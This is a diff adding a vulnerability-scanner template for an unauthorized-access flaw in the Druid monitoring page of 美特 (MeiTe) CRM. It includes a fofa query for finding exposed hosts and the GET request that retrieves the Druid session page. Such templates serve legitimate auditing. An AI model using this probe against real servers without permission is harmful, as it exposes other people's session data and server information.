@@ -1,0 +1,24 @@
+id: MeiTe-CRM-druid-Unauthorized
+
+info:
+  name: "美特 CRM druid 组件未授权访问漏洞"
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: body="/common/scripts/basic.js"
+    美特 CRM druid 组件存在未授权访问漏洞，未经身份验证的攻击者可以通过该漏洞获取服务器敏感信息。
+  reference:
+    - 
+  tags: 美特 CRM
+
+http:
+  - raw:
+      - |
+        GET /druid/websession.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: 未授权访问
+        dsl:
+          - 'status_code==200 && contains_all(body,"<title>Druid")'
